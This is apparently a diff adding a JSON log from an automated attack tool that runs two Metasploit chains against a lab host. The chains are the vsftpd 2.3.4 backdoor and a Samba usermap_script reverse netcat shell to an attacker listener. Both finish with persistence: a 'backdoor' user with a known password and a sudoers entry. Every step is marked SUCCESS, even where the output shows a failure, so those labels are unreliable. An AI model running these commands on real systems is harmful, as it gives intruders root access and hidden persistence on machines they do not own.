@@ -1,0 +1,284 @@
+{
+    "target": "10.10.18.7",
+    "attack_chains": {
+        "Chain 1: vsftpd 2.3.4 Backdoor Exploit": {
+            "initial_access": [
+                {
+                    "description": "Exploit vsftpd backdoor to gain shell",
+                    "command": "msfconsole -q",
+                    "command_type": "start_session",
+                    "raw_output": "Persistent session 'ftp_session' started",
+                    "analysis": "Type: start_session. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit vsftpd backdoor to gain shell",
+                    "command": "use { :;}; echo 'Exploited vsftpd backdoor'",
+                    "command_type": "session_command",
+                    "raw_output": "use { :;}; echo 'Exploited vsftpd backdoor'\nmsf > use { :;}; echo 'Exploited vsftpd backdoor'\n[-] No results from search\n[-] Failed to load module: {\nmsf >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit vsftpd backdoor to gain shell",
+                    "command": "use exploit/unix/ftp/vsftpd_234_backdoor",
+                    "command_type": "session_command",
+                    "raw_output": "use { :;}; echo 'Exploited vsftpd backdoor'\nmsf > use { :;}; echo 'Exploited vsftpd backdoor'\n[-] No results from search\n[-] Failed to load module: {\nmsf > use exploit/unix/ftp/vsftpd_234_backdoor\n[*] No payload configured, defaulting to cmd/unix/interact\nmsf exploit(unix/ftp/vsftpd_234_backdoor) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit vsftpd backdoor to gain shell",
+                    "command": "set RHOSTS 10.10.18.7",
+                    "command_type": "session_command",
+                    "raw_output": "use { :;}; echo 'Exploited vsftpd backdoor'\nmsf > use { :;}; echo 'Exploited vsftpd backdoor'\n[-] No results from search\n[-] Failed to load module: {\nmsf > use exploit/unix/ftp/vsftpd_234_backdoor\n[*] No payload configured, defaulting to cmd/unix/interact\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.18.7\nRHOSTS => 10.10.18.7\nmsf exploit(unix/ftp/vsftpd_234_backdoor) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit vsftpd backdoor to gain shell",
+                    "command": "exploit -j",
+                    "command_type": "session_command",
+                    "raw_output": "use { :;}; echo 'Exploited vsftpd backdoor'\nmsf > use { :;}; echo 'Exploited vsftpd backdoor'\n[-] No results from search\n[-] Failed to load module: {\nmsf > use exploit/unix/ftp/vsftpd_234_backdoor\n[*] No payload configured, defaulting to cmd/unix/interact\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.18.7\nRHOSTS => 10.10.18.7\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n\n[*] 10.10.18.7:21 - Banner: 220 (vsFTPd 2.3.4)\n[*] 10.10.18.7:21 - USER: 331 Please specify the password.\n[+] 10.10.18.7:21 - Backdoor service has been spawned, handling...\n[+] 10.10.18.7:21 - UID: uid=0(root) gid=0(root)\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > [*] Found shell.\n[*] Command shell session 1 opened (10.10.18.6:42875 -> 10.10.18.7:6200) at 2025\n-12-10 12:55:01 -0500\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit vsftpd backdoor to gain shell",
+                    "command": "sessions -l",
+                    "command_type": "session_command",
+                    "raw_output": "use { :;}; echo 'Exploited vsftpd backdoor'\nmsf > use { :;}; echo 'Exploited vsftpd backdoor'\n[-] No results from search\n[-] Failed to load module: {\nmsf > use exploit/unix/ftp/vsftpd_234_backdoor\n[*] No payload configured, defaulting to cmd/unix/interact\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.18.7\nRHOSTS => 10.10.18.7\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n\n[*] 10.10.18.7:21 - Banner: 220 (vsFTPd 2.3.4)\n[*] 10.10.18.7:21 - USER: 331 Please specify the password.\n[+] 10.10.18.7:21 - Backdoor service has been spawned, handling...\n[+] 10.10.18.7:21 - UID: uid=0(root) gid=0(root)\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > [*] Found shell.\n[*] Command shell session 1 opened (10.10.18.6:42875 -> 10.10.18.7:6200) at 2025\n-12-10 12:55:01 -0500\nsessions -l\n\nActive sessions\n===============\n\n  Id  Name  Type            Information  Connection\n  --  ----  ----            -----------  ----------\n  1         shell cmd/unix               10.10.18.6:42875 -> 10.10.18.7:6200 (\n                                         10.10.18.7)\n\nmsf exploit(unix/ftp/vsftpd_234_backdoor) >\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                }
+            ],
+            "privilege_escalation": [
+                {
+                    "description": "Verify shell and escalate if needed (already root in this case)",
+                    "command": "sessions -i 1 -c 'id'",
+                    "command_type": "session_command",
+                    "raw_output": "use { :;}; echo 'Exploited vsftpd backdoor'\nmsf > use { :;}; echo 'Exploited vsftpd backdoor'\n[-] No results from search\n[-] Failed to load module: {\nmsf > use exploit/unix/ftp/vsftpd_234_backdoor\n[*] No payload configured, defaulting to cmd/unix/interact\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.18.7\nRHOSTS => 10.10.18.7\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n\n[*] 10.10.18.7:21 - Banner: 220 (vsFTPd 2.3.4)\n[*] 10.10.18.7:21 - USER: 331 Please specify the password.\n[+] 10.10.18.7:21 - Backdoor service has been spawned, handling...\n[+] 10.10.18.7:21 - UID: uid=0(root) gid=0(root)\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > [*] Found shell.\n[*] Command shell session 1 opened (10.10.18.6:42875 -> 10.10.18.7:6200) at 2025\n-12-10 12:55:01 -0500\nsessions -l\n\nActive sessions\n===============\n\n  Id  Name  Type            Information  Connection\n  --  ----  ----            -----------  ----------\n  1         shell cmd/unix               10.10.18.6:42875 -> 10.10.18.7:6200 (\n                                         10.10.18.7)\n\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > sessions -i 1 -c 'id'\n[*] Running 'id' on shell session 1 (10.10.18.7)\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Verify shell and escalate if needed (already root in this case)",
+                    "command": "sessions -i 1 -c 'whoami'",
+                    "command_type": "session_command",
+                    "raw_output": "use { :;}; echo 'Exploited vsftpd backdoor'\nmsf > use { :;}; echo 'Exploited vsftpd backdoor'\n[-] No results from search\n[-] Failed to load module: {\nmsf > use exploit/unix/ftp/vsftpd_234_backdoor\n[*] No payload configured, defaulting to cmd/unix/interact\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.18.7\nRHOSTS => 10.10.18.7\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n\n[*] 10.10.18.7:21 - Banner: 220 (vsFTPd 2.3.4)\n[*] 10.10.18.7:21 - USER: 331 Please specify the password.\n[+] 10.10.18.7:21 - Backdoor service has been spawned, handling...\n[+] 10.10.18.7:21 - UID: uid=0(root) gid=0(root)\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > [*] Found shell.\n[*] Command shell session 1 opened (10.10.18.6:42875 -> 10.10.18.7:6200) at 2025\n-12-10 12:55:01 -0500\nsessions -l\n\nActive sessions\n===============\n\n  Id  Name  Type            Information  Connection\n  --  ----  ----            -----------  ----------\n  1         shell cmd/unix               10.10.18.6:42875 -> 10.10.18.7:6200 (\n                                         10.10.18.7)\n\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > sessions -i 1 -c 'id'\n[*] Running 'id' on shell session 1 (10.10.18.7)\nsessions -i 1 -c 'whoami'\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                }
+            ],
+            "persistence": [
+                {
+                    "description": "Add persistent backdoor user",
+                    "command": "sessions -i 1 -c 'useradd -m -s /bin/bash backdoor'",
+                    "command_type": "session_command",
+                    "raw_output": "use { :;}; echo 'Exploited vsftpd backdoor'\nmsf > use { :;}; echo 'Exploited vsftpd backdoor'\n[-] No results from search\n[-] Failed to load module: {\nmsf > use exploit/unix/ftp/vsftpd_234_backdoor\n[*] No payload configured, defaulting to cmd/unix/interact\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.18.7\nRHOSTS => 10.10.18.7\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n\n[*] 10.10.18.7:21 - Banner: 220 (vsFTPd 2.3.4)\n[*] 10.10.18.7:21 - USER: 331 Please specify the password.\n[+] 10.10.18.7:21 - Backdoor service has been spawned, handling...\n[+] 10.10.18.7:21 - UID: uid=0(root) gid=0(root)\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > [*] Found shell.\n[*] Command shell session 1 opened (10.10.18.6:42875 -> 10.10.18.7:6200) at 2025\n-12-10 12:55:01 -0500\nsessions -l\n\nActive sessions\n===============\n\n  Id  Name  Type            Information  Connection\n  --  ----  ----            -----------  ----------\n  1         shell cmd/unix               10.10.18.6:42875 -> 10.10.18.7:6200 (\n                                         10.10.18.7)\n\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > sessions -i 1 -c 'id'\n[*] Running 'id' on shell session 1 (10.10.18.7)\nsessions -i 1 -c 'whoami'\nsessions -i 1 -c 'useradd -m -s /bin/bash backdoor'\nuid=0(root) gid=0(root)\n\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > sessions -i 1 -c 'whoami'\n[*] Running 'whoami' on shell session 1 (10.10.18.7)\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Add persistent backdoor user",
+                    "command": "sessions -i 1 -c \"echo 'backdoor:password' | chpasswd\"",
+                    "command_type": "session_command",
+                    "raw_output": "use { :;}; echo 'Exploited vsftpd backdoor'\nmsf > use { :;}; echo 'Exploited vsftpd backdoor'\n[-] No results from search\n[-] Failed to load module: {\nmsf > use exploit/unix/ftp/vsftpd_234_backdoor\n[*] No payload configured, defaulting to cmd/unix/interact\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.18.7\nRHOSTS => 10.10.18.7\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n\n[*] 10.10.18.7:21 - Banner: 220 (vsFTPd 2.3.4)\n[*] 10.10.18.7:21 - USER: 331 Please specify the password.\n[+] 10.10.18.7:21 - Backdoor service has been spawned, handling...\n[+] 10.10.18.7:21 - UID: uid=0(root) gid=0(root)\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > [*] Found shell.\n[*] Command shell session 1 opened (10.10.18.6:42875 -> 10.10.18.7:6200) at 2025\n-12-10 12:55:01 -0500\nsessions -l\n\nActive sessions\n===============\n\n  Id  Name  Type            Information  Connection\n  --  ----  ----            -----------  ----------\n  1         shell cmd/unix               10.10.18.6:42875 -> 10.10.18.7:6200 (\n                                         10.10.18.7)\n\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > sessions -i 1 -c 'id'\n[*] Running 'id' on shell session 1 (10.10.18.7)\nsessions -i 1 -c 'whoami'\nsessions -i 1 -c 'useradd -m -s /bin/bash backdoor'\nuid=0(root) gid=0(root)\n\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > sessions -i 1 -c 'whoami'\n[*] Running 'whoami' on shell session 1 (10.10.18.7)\nsessions -i 1 -c \"echo 'backdoor:password' | chpasswd\"\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Add persistent backdoor user",
+                    "command": "sessions -i 1 -c 'echo \"backdoor ALL=(ALL) ALL\" >> /etc/sudoers'",
+                    "command_type": "session_command",
+                    "raw_output": "use { :;}; echo 'Exploited vsftpd backdoor'\nmsf > use { :;}; echo 'Exploited vsftpd backdoor'\n[-] No results from search\n[-] Failed to load module: {\nmsf > use exploit/unix/ftp/vsftpd_234_backdoor\n[*] No payload configured, defaulting to cmd/unix/interact\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.18.7\nRHOSTS => 10.10.18.7\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n\n[*] 10.10.18.7:21 - Banner: 220 (vsFTPd 2.3.4)\n[*] 10.10.18.7:21 - USER: 331 Please specify the password.\n[+] 10.10.18.7:21 - Backdoor service has been spawned, handling...\n[+] 10.10.18.7:21 - UID: uid=0(root) gid=0(root)\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > [*] Found shell.\n[*] Command shell session 1 opened (10.10.18.6:42875 -> 10.10.18.7:6200) at 2025\n-12-10 12:55:01 -0500\nsessions -l\n\nActive sessions\n===============\n\n  Id  Name  Type            Information  Connection\n  --  ----  ----            -----------  ----------\n  1         shell cmd/unix               10.10.18.6:42875 -> 10.10.18.7:6200 (\n                                         10.10.18.7)\n\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > sessions -i 1 -c 'id'\n[*] Running 'id' on shell session 1 (10.10.18.7)\nsessions -i 1 -c 'whoami'\nsessions -i 1 -c 'useradd -m -s /bin/bash backdoor'\nuid=0(root) gid=0(root)\n\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > sessions -i 1 -c 'whoami'\n[*] Running 'whoami' on shell session 1 (10.10.18.7)\nsessions -i 1 -c \"echo 'backdoor:password' | chpasswd\"\nsessions -i 1 -c 'echo \"backdoor ALL=(ALL) ALL\" >> /etc/sudoers'\nroot\n\nmsf exploit(unix/ftp/vsftpd_234_backdoor) > sessions -i 1 -c 'useradd -m -s /bin\n/bash backdoor'\n[*] Running 'useradd -m -s /bin/bash backdoor' on shell session 1 (10.10.18.7)\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Add persistent backdoor user",
+                    "command": "<close_session operation>",
+                    "command_type": "close_session",
+                    "raw_output": "Session 'ftp_session' closed",
+                    "analysis": "Type: close_session. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                }
+            ],
+            "overall_status": "completed",
+            "furthest_stage": "persistence",
+            "notes": []
+        },
+        "Chain 2: Samba usermap_script Exploit": {
+            "initial_access": [
+                {
+                    "description": "Exploit Samba to gain reverse shell",
+                    "command": "msfconsole -q",
+                    "command_type": "start_session",
+                    "raw_output": "Persistent session 'samba_session' started",
+                    "analysis": "Type: start_session. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit Samba to gain reverse shell",
+                    "command": "use exploit/multi/samba/usermap_script",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/samba/usermap_script\nmsf > use exploit/multi/samba/usermap_script\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit Samba to gain reverse shell",
+                    "command": "set RHOSTS 10.10.18.7",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/samba/usermap_script\nmsf > use exploit/multi/samba/usermap_script\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set RHOSTS 10.10.18.7\nRHOSTS => 10.10.18.7\nmsf exploit(multi/samba/usermap_script) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit Samba to gain reverse shell",
+                    "command": "set PAYLOAD cmd/unix/reverse_netcat",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/samba/usermap_script\nmsf > use exploit/multi/samba/usermap_script\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set RHOSTS 10.10.18.7\nRHOSTS => 10.10.18.7\nmsf exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit Samba to gain reverse shell",
+                    "command": "set LHOST 10.11.10.2",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/samba/usermap_script\nmsf > use exploit/multi/samba/usermap_script\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set RHOSTS 10.10.18.7\nRHOSTS => 10.10.18.7\nmsf exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set LHOST 10.11.10.2\nLHOST => 10.11.10.2\nmsf exploit(multi/samba/usermap_script) >\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit Samba to gain reverse shell",
+                    "command": "set LPORT 4444",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/samba/usermap_script\nmsf > use exploit/multi/samba/usermap_script\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set RHOSTS 10.10.18.7\nRHOSTS => 10.10.18.7\nmsf exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set LHOST 10.11.10.2\nLHOST => 10.11.10.2\nmsf exploit(multi/samba/usermap_script) > set LPORT 4444\nLPORT => 4444\nmsf exploit(multi/samba/usermap_script) >\n\n\n\n\n\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit Samba to gain reverse shell",
+                    "command": "exploit -j",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/samba/usermap_script\nmsf > use exploit/multi/samba/usermap_script\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set RHOSTS 10.10.18.7\nRHOSTS => 10.10.18.7\nmsf exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set LHOST 10.11.10.2\nLHOST => 10.11.10.2\nmsf exploit(multi/samba/usermap_script) > set LPORT 4444\nLPORT => 4444\nmsf exploit(multi/samba/usermap_script) > exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n[*] Started reverse TCP handler on 10.11.10.2:4444\nmsf exploit(multi/samba/usermap_script) > [*] Command shell session 1 opened (10\n.11.10.2:4444 -> 10.11.10.1:59348) at 2025-12-10 12:55:33 -0500\n\n\n\n\n\n\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Exploit Samba to gain reverse shell",
+                    "command": "sessions -l",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/samba/usermap_script\nmsf > use exploit/multi/samba/usermap_script\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set RHOSTS 10.10.18.7\nRHOSTS => 10.10.18.7\nmsf exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set LHOST 10.11.10.2\nLHOST => 10.11.10.2\nmsf exploit(multi/samba/usermap_script) > set LPORT 4444\nLPORT => 4444\nmsf exploit(multi/samba/usermap_script) > exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n[*] Started reverse TCP handler on 10.11.10.2:4444\nmsf exploit(multi/samba/usermap_script) > [*] Command shell session 1 opened (10\n.11.10.2:4444 -> 10.11.10.1:59348) at 2025-12-10 12:55:33 -0500\nsessions -l\n\nActive sessions\n===============\n\n  Id  Name  Type            Information  Connection\n  --  ----  ----            -----------  ----------\n  1         shell cmd/unix               10.11.10.2:4444 -> 10.11.10.1:59348 (\n                                         10.10.18.7)\n\nmsf exploit(multi/samba/usermap_script) >\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                }
+            ],
+            "privilege_escalation": [
+                {
+                    "description": "Verify root shell",
+                    "command": "sessions -i 1 -c 'id'",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/samba/usermap_script\nmsf > use exploit/multi/samba/usermap_script\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set RHOSTS 10.10.18.7\nRHOSTS => 10.10.18.7\nmsf exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set LHOST 10.11.10.2\nLHOST => 10.11.10.2\nmsf exploit(multi/samba/usermap_script) > set LPORT 4444\nLPORT => 4444\nmsf exploit(multi/samba/usermap_script) > exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n[*] Started reverse TCP handler on 10.11.10.2:4444\nmsf exploit(multi/samba/usermap_script) > [*] Command shell session 1 opened (10\n.11.10.2:4444 -> 10.11.10.1:59348) at 2025-12-10 12:55:33 -0500\nsessions -l\n\nActive sessions\n===============\n\n  Id  Name  Type            Information  Connection\n  --  ----  ----            -----------  ----------\n  1         shell cmd/unix               10.11.10.2:4444 -> 10.11.10.1:59348 (\n                                         10.10.18.7)\n\nmsf exploit(multi/samba/usermap_script) > sessions -i 1 -c 'id'\n[*] Running 'id' on shell session 1 (10.10.18.7)\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                }
+            ],
+            "persistence": [
+                {
+                    "description": "Add persistent backdoor user",
+                    "command": "sessions -i 1 -c 'useradd -m -s /bin/bash backdoor'",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/samba/usermap_script\nmsf > use exploit/multi/samba/usermap_script\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set RHOSTS 10.10.18.7\nRHOSTS => 10.10.18.7\nmsf exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set LHOST 10.11.10.2\nLHOST => 10.11.10.2\nmsf exploit(multi/samba/usermap_script) > set LPORT 4444\nLPORT => 4444\nmsf exploit(multi/samba/usermap_script) > exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n[*] Started reverse TCP handler on 10.11.10.2:4444\nmsf exploit(multi/samba/usermap_script) > [*] Command shell session 1 opened (10\n.11.10.2:4444 -> 10.11.10.1:59348) at 2025-12-10 12:55:33 -0500\nsessions -l\n\nActive sessions\n===============\n\n  Id  Name  Type            Information  Connection\n  --  ----  ----            -----------  ----------\n  1         shell cmd/unix               10.11.10.2:4444 -> 10.11.10.1:59348 (\n                                         10.10.18.7)\n\nmsf exploit(multi/samba/usermap_script) > sessions -i 1 -c 'id'\n[*] Running 'id' on shell session 1 (10.10.18.7)\nsessions -i 1 -c 'useradd -m -s /bin/bash backdoor'\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Add persistent backdoor user",
+                    "command": "sessions -i 1 -c \"echo 'backdoor:password' | chpasswd\"",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/samba/usermap_script\nmsf > use exploit/multi/samba/usermap_script\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set RHOSTS 10.10.18.7\nRHOSTS => 10.10.18.7\nmsf exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set LHOST 10.11.10.2\nLHOST => 10.11.10.2\nmsf exploit(multi/samba/usermap_script) > set LPORT 4444\nLPORT => 4444\nmsf exploit(multi/samba/usermap_script) > exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n[*] Started reverse TCP handler on 10.11.10.2:4444\nmsf exploit(multi/samba/usermap_script) > [*] Command shell session 1 opened (10\n.11.10.2:4444 -> 10.11.10.1:59348) at 2025-12-10 12:55:33 -0500\nsessions -l\n\nActive sessions\n===============\n\n  Id  Name  Type            Information  Connection\n  --  ----  ----            -----------  ----------\n  1         shell cmd/unix               10.11.10.2:4444 -> 10.11.10.1:59348 (\n                                         10.10.18.7)\n\nmsf exploit(multi/samba/usermap_script) > sessions -i 1 -c 'id'\n[*] Running 'id' on shell session 1 (10.10.18.7)\nsessions -i 1 -c 'useradd -m -s /bin/bash backdoor'\nsessions -i 1 -c \"echo 'backdoor:password' | chpasswd\"\nuid=0(root) gid=0(root)\n\nmsf exploit(multi/samba/usermap_script) > sessions -i 1 -c 'useradd -m -s /bin/b\nash backdoor'\n[*] Running 'useradd -m -s /bin/bash backdoor' on shell session 1 (10.10.18.7)\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Add persistent backdoor user",
+                    "command": "sessions -i 1 -c 'echo \"backdoor ALL=(ALL) ALL\" >> /etc/sudoers'",
+                    "command_type": "session_command",
+                    "raw_output": "use exploit/multi/samba/usermap_script\nmsf > use exploit/multi/samba/usermap_script\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set RHOSTS 10.10.18.7\nRHOSTS => 10.10.18.7\nmsf exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/reverse_netcat\nPAYLOAD => cmd/unix/reverse_netcat\nmsf exploit(multi/samba/usermap_script) > set LHOST 10.11.10.2\nLHOST => 10.11.10.2\nmsf exploit(multi/samba/usermap_script) > set LPORT 4444\nLPORT => 4444\nmsf exploit(multi/samba/usermap_script) > exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n[*] Started reverse TCP handler on 10.11.10.2:4444\nmsf exploit(multi/samba/usermap_script) > [*] Command shell session 1 opened (10\n.11.10.2:4444 -> 10.11.10.1:59348) at 2025-12-10 12:55:33 -0500\nsessions -l\n\nActive sessions\n===============\n\n  Id  Name  Type            Information  Connection\n  --  ----  ----            -----------  ----------\n  1         shell cmd/unix               10.11.10.2:4444 -> 10.11.10.1:59348 (\n                                         10.10.18.7)\n\nmsf exploit(multi/samba/usermap_script) > sessions -i 1 -c 'id'\n[*] Running 'id' on shell session 1 (10.10.18.7)\nsessions -i 1 -c 'useradd -m -s /bin/bash backdoor'\nsessions -i 1 -c \"echo 'backdoor:password' | chpasswd\"\nuid=0(root) gid=0(root)\n\nmsf exploit(multi/samba/usermap_script) > sessions -i 1 -c 'useradd -m -s /bin/b\nash backdoor'\n[*] Running 'useradd -m -s /bin/bash backdoor' on shell session 1 (10.10.18.7)\nsessions -i 1 -c 'echo \"backdoor ALL=(ALL) ALL\" >> /etc/sudoers'\n\n",
+                    "analysis": "Type: session_command. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                },
+                {
+                    "description": "Add persistent backdoor user",
+                    "command": "<close_session operation>",
+                    "command_type": "close_session",
+                    "raw_output": "Session 'samba_session' closed",
+                    "analysis": "Type: close_session. SUCCESS",
+                    "status": "success",
+                    "return_code": 0,
+                    "failure_reason": null
+                }
+            ],
+            "overall_status": "completed",
+            "furthest_stage": "persistence",
+            "notes": []
+        }
+    },
+    "failed_chains": [],
+    "initial_chains": [],
+    "privilege_chains": [],
+    "persistence_chains": [
+        "Chain 1: vsftpd 2.3.4 Backdoor Exploit",
+        "Chain 2: Samba usermap_script Exploit"
+    ]
+}
